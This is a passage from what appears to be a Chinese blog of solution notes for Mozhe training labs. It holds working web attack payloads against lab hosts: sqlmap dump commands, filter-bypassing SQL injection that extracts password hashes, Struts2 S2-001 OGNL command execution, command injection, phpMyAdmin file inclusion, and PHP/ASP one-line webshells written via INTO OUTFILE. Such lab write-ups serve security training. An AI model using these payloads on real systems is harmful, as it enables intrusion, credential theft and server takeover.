class="line">#麻了		以下有sqlmap用法</span><br><span class="line">//https://blog.csdn.net/m0_60945802/article/details/123636747</span><br><span class="line">--查数据库	这一步很多有y/n</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 --dbs</span><br><span class="line">--查表名</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup --tables</span><br><span class="line">--查字段</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup -T member --columns —batch</span><br><span class="line">--</span><br><span class="line">sqlmap -u http://124.70.71.251:47396/new_list.php?id=1 -D stormgroup -T member -C name,password --dump</span><br><span class="line">参数参考https://www.csdn.net/tags/OtTaAgxsMjMxMzYtYmxvZwO0O0OO0O0O.html</span><br><span class="line">-batch	</span><br><span class="line">--dump	获取整个表的数据</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入漏洞测试-HTTP头注入"><a href="#SQL注入漏洞测试-HTTP头注入" class="headerlink" title="SQL注入漏洞测试(HTTP头注入)"></a>SQL注入漏洞测试(HTTP头注入)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前端知道后端搞了个X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>作为注入点</span><br><span class="line">#说明有<span class="number">4</span>个回显</span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line">#<span class="number">1</span>被吞了，其它在页面可以显示</span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654777777367.png" alt="1654777777367"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--数据库名pentesterlab</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database(), <span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">--数据表名comment，flag，goods，user</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pentesterlab&#x27;</span></span><br><span class="line"><span class="comment">--flag表的column名	id flag</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="comment">--flag值</span></span><br><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">for</span>: <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(flag), <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> pentesterlab.flag</span><br></pre></td></tr></table></figure>

<h3 id="SQL过滤字符后手工注入漏洞测试-第1题"><a href="#SQL过滤字符后手工注入漏洞测试-第1题" class="headerlink" title="SQL过滤字符后手工注入漏洞测试(第1题)"></a>SQL过滤字符后手工注入漏洞测试(第1题)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--寻找注入点，根据提示16进制url编码，注释符</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654829272476.png" alt="1654829272476"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>m0_67399862<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">124970489</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654845576925.png" alt="1654845576925"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--=空格被过滤分别用like /**/代替，然后整个转16进制url</span></span><br><span class="line"><span class="comment">--正常</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">1</span></span><br><span class="line"><span class="comment">--异常</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span></span><br><span class="line"><span class="comment">--4个回显</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span></span><br><span class="line"><span class="comment">--6,7位置可以显示，这里注意union前面没有and</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span></span><br><span class="line"><span class="comment">--数据库名		mozhe_discuz_stormgroup</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,database(),<span class="number">7</span>,<span class="number">8</span></span><br><span class="line"><span class="comment">--表名		notice,stormgroup_member</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(table_name),<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span>database()</span><br><span class="line"><span class="comment">--列名		id,name,password,status</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(column_name),<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="string">&#x27;stormgroup_member&#x27;</span></span><br><span class="line"><span class="comment">--查name，password</span></span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">5</span>,group_concat(name),group_concat(password),<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mozhe_discuz_stormgroup.stormgroup_member</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mozhe,mozhe,admin</span></span><br><span class="line"><span class="comment">356f589a7df439f6f744ff19bb8092c0,a6babd9eb561e9ffd6f5aad28851daa7,e70be84907793e52f974a062e2bfcd4d</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">dsan13</span><br><span class="line">nothere</span><br><span class="line"><span class="number">548427</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="WebShell文件上传漏洞分析溯源-第1题"><a href="#WebShell文件上传漏洞分析溯源-第1题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第1题)"></a>WebShell文件上传漏洞分析溯源(第1题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上传文件两个注意点：php5后缀	post请求		然后连接中国蚁剑即可</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WebShell文件上传漏洞分析溯源-第2题"><a href="#WebShell文件上传漏洞分析溯源-第2题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第2题)"></a>WebShell文件上传漏洞分析溯源(第2题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前端验证		edge不能直接改网页的javascript代码</span></span><br><span class="line"><span class="comment">//上传.jpg	bp改.cmd绕过</span></span><br><span class="line"><span class="comment">//解法2	edge设置搜索javascript禁用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="内部文件上传系统漏洞分析溯源-墨者"><a href="#内部文件上传系统漏洞分析溯源-墨者" class="headerlink" title="内部文件上传系统漏洞分析溯源(墨者)"></a>内部文件上传系统漏洞分析溯源(墨者)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">后缀asp！！</span><br><span class="line">//参考</span><br><span class="line">https://blog.csdn.net/weixin_43072923/article/details/115512018</span><br><span class="line">IIS的漏洞，上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行,修改为upload文件夹修改为hyy.asp</span><br><span class="line">//asp文件一句话木马</span><br><span class="line">&lt;% eval request(&quot;a&quot;) %&gt;</span><br><span class="line">request可以直接连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Apache-Struts2远程代码执行漏洞-S2-004-复现"><a href="#Apache-Struts2远程代码执行漏洞-S2-004-复现" class="headerlink" title="Apache Struts2远程代码执行漏洞(S2-004)复现"></a>Apache Struts2远程代码执行漏洞(S2-004)复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struts框架遍历目录漏洞</span><br><span class="line">//参考</span><br><span class="line">https://blog.csdn.net/zr1213159840/article/details/122385059</span><br><span class="line">http://124.70.71.251:44122/struts/..%252f</span><br><span class="line">%25是%的ascii码</span><br><span class="line">%2f是/的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="命令注入执行分析"><a href="#命令注入执行分析" class="headerlink" title="命令注入执行分析"></a>命令注入执行分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//前端验证bp绕过或者禁用javascript</span><br><span class="line">iipp = 127.0.0.1|ls</span><br><span class="line">iipp = 127.0.0.1|cat&lt;key_x.php  或者	iipp = 127.0.0.1|cat key_x.php</span><br><span class="line">关于前端的验证</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654693346739.png" alt="1654693346739"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">浏览器缓存地址：internet选项-&gt;设置可以看到</span><br><span class="line">C:\Users\hyy\AppData\Local\Microsoft\Windows\INetCache</span><br><span class="line"></span><br><span class="line">linux &lt; 用法参考https://blog.csdn.net/qq_42883292/article/details/107588117</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Bash漏洞分析溯源"><a href="#Bash漏洞分析溯源" class="headerlink" title="Bash漏洞分析溯源"></a>Bash漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#火狐浏览器about:config的general.useragent.override可以更改报文的useragent</span><br><span class="line">尝试抓包改UA，但是发现不行不知道为啥</span><br><span class="line">但是使用curl指令可以</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656651451933.png" alt="1656651451933"></p>
<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656653253106.png" alt="1656653253106"></p>
<h3 id="Apache-Struts2远程代码执行漏洞-S2-001-复现"><a href="#Apache-Struts2远程代码执行漏洞-S2-001-复现" class="headerlink" title="Apache Struts2远程代码执行漏洞(S2-001)复现"></a>Apache Struts2远程代码执行漏洞(S2-001)复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞文档参考https://cwiki.apache.org/confluence/display/WW/S2-001</span><br><span class="line">参考https://blog.csdn.net/m0_58606546/article/details/122488427</span><br><span class="line">%&#123;1+2&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;,&quot;/&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]</span><br><span class="line"></span><br><span class="line">&#123;&quot;cat&quot;,&quot;/key.txt&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="表单暴力破解实训-第1题"><a href="#表单暴力破解实训-第1题" class="headerlink" title="表单暴力破解实训(第1题)"></a>表单暴力破解实训(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h2><h3 id="BeesCMS系统漏洞分析溯源"><a href="#BeesCMS系统漏洞分析溯源" class="headerlink" title="BeesCMS系统漏洞分析溯源"></a>BeesCMS系统漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先使用御剑扫描目录，得到后台登陆地址</span><br><span class="line"></span><br><span class="line">参考https://blog.csdn.net/asd158923328/article/details/99935925</span><br><span class="line">抓包知验证码为后端验证</span><br><span class="line">用户名输入	&#x27; or 1=1	得</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654788591129.png" alt="1654788591129"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">得：	<span class="number">5</span>个回显	等号被过滤了</span><br><span class="line"><span class="comment">--发现 union select都被过滤了</span></span><br><span class="line"><span class="string">&#x27; or union select 1,2,3,4,5#</span></span><br><span class="line"><span class="string">--select可以双写绕过</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>#</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; or unio union n selecselectt 1,2,3,4,5#</span></span><br><span class="line"><span class="string">未完</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="PHP本地包含漏洞代码溯源"><a href="#PHP本地包含漏洞代码溯源" class="headerlink" title="PHP本地包含漏洞代码溯源"></a>PHP本地包含漏洞代码溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据提示：	http://124.70.71.251:46125/r.php?p=/the_key_is_here</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="phpMyAdmin后台文件包含分析溯源"><a href="#phpMyAdmin后台文件包含分析溯源" class="headerlink" title="phpMyAdmin后台文件包含分析溯源"></a>phpMyAdmin后台文件包含分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实施流程参考https://blog.csdn.net/qq_40554015/article/details/121297782#commentBox</span><br><span class="line">首先弱口令爆破进后台，执行select &#x27;&lt;?php phpinfo();?&gt;&#x27;会写入到session文件中</span><br><span class="line">然后http://124.70.71.251:42175/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_q76ker8iqgqak6ed24e5iprtj6lkoe9h</span><br><span class="line">最后面是phpmyadmin的cookie值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656672695310.png" alt="1656672695310"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_SERVER[&#x27;SCRIPT_FILENAME&#x27;]或者_SERVER[&#x27;DOCUMENT_ROOT&#x27;]的绝对路径</span><br><span class="line">这里有两种方法</span><br><span class="line">常用的路径总结：MySQL数据库安装目录（/var/lib/mysql）,web站点默认目录（/var/www/html/）</span><br><span class="line">1.sql写入一句话木马</span><br><span class="line">一些相关命令</span><br><span class="line">show variables like &#x27;general_log&#x27;; -- 查看日志是否开启</span><br><span class="line">set global general_log=on; -- 开启日志功能</span><br><span class="line">show variables like &#x27;general_log_file&#x27;; -- 看看日志文件保存位置</span><br><span class="line">set global general_log_file=&#x27;tmp/general.lg&#x27;; -- 设置日志文件保存位置</span><br><span class="line">show variables like &#x27;log_output&#x27;; -- 看看日志输出类型 table或file</span><br><span class="line">set global log_output=&#x27;table&#x27;; -- 设置输出类型为 table</span><br><span class="line">set global log_output=&#x27;file&#x27;; -- 设置输出类型为file</span><br><span class="line">用sql植入一句话木马，select &#x27;&lt;?php @eval($_POST[flag]);?&gt;&#x27; into outfile &#x27;/var/www/html/hack.php&#x27;</span><br><span class="line">蚁剑连接即可</span><br><span class="line">2.文件包含的方法</span><br><span class="line">这个链接是CVE-2018-12613 PhpMyadmin后台文件包含分析</span><br><span class="line">参考https://www.likecs.com/show-204906016.html</span><br><span class="line"></span><br><span class="line">首先index.php中判断4个与才会被包含，第四个与在ip/libraries/classes/Core.php的443行开始那个函数，第一个true出不来</span><br><span class="line">第二个true是取出?前面内容后做判断，是下面的路径http://124.70.71.251:46673/index.php?target=db_datadict.php?%20../../../../../key.txt</span><br><span class="line">如果从第三个true是先对原始page做urldecode再取出?前面内容做判断</span><br><span class="line">http://124.70.71.251:46673/index.php?target=db_datadict.php%253f%20../../../../../key.txt</span><br><span class="line">写了如下叫本验证，notice不用管他</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656693781113.png" alt="1656693781113"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php中include的是php接受的target即</span><br><span class="line">target=db_datadict.php? ../../../../../key.txt或者</span><br><span class="line">target=db_datadict.php%3f ../../../../../key.txt target</span><br><span class="line">也就是说这两者都可以解析到 /key.txt不太明白。有一个说法是</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656694004093.png" alt="1656694004093"></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="SVN信息泄露漏洞分析-第1题"><a href="#SVN信息泄露漏洞分析-第1题" class="headerlink" title="SVN信息泄露漏洞分析(第1题)"></a>SVN信息泄露漏洞分析(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/90ac632e7134</span><br><span class="line">	SVN（subversion）是源代码版本管理软件。在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构</span><br><span class="line">	svn1.6版本之前		/.svn/entrist</span><br><span class="line">	svn1.7之后		/.svn/wc.db</span><br><span class="line">使用sqlitestudio打开</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h1><h3 id="HTTP动作练习"><a href="#HTTP动作练习" class="headerlink" title="HTTP动作练习"></a>HTTP动作练习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">抓包右键change request method			get自动转post		注意改在哪里</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h3><p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654154126322.png" alt="1654154126322"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NetType:2G</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="投票常见漏洞分析溯源"><a href="#投票常见漏洞分析溯源" class="headerlink" title="投票常见漏洞分析溯源"></a>投票常见漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">抓包send to intruder,然后改useragent加上X-Forward-For</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654575442812.png" alt="1654575442812"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload中payload type改numbers，payload option 1-255step1，这么会发送X-Forward-X从10.1.1.1-10.1.255.1以及10.1.0.1-10.1.0.255</span><br><span class="line"></span><br><span class="line">关于useragent</span><br><span class="line">//https://baijiahao.baidu.com/s?id=1695943965001485777&amp;wfr=spider&amp;for=pc</span><br><span class="line">本机edge的UA：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33</span><br><span class="line">https://baijiahao.baidu.com/s?id=1695943965001485777&amp;wfr=spider&amp;for=pc</span><br><span class="line">本机chrome的UA：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line">关于X-Forward-X</span><br><span class="line">用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WEB页面源代码查看"><a href="#WEB页面源代码查看" class="headerlink" title="WEB页面源代码查看"></a>WEB页面源代码查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key在右键检查里面</span><br><span class="line">chrome快捷键f12</span><br><span class="line">edge不知道</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HTML前端代码分析-暗链"><a href="#HTML前端代码分析-暗链" class="headerlink" title="HTML前端代码分析(暗链)"></a>HTML前端代码分析(暗链)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">右键检查或者view-source查看网页源码</span><br><span class="line">检索href发现一个内网链接</span><br><span class="line">将php文件加到公网后面查看源码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="热点评论刷分漏洞分析溯源"><a href="#热点评论刷分漏洞分析溯源" class="headerlink" title="热点评论刷分漏洞分析溯源"></a>热点评论刷分漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br><span class="line"></span><br></pre></td></tr></table></figure>

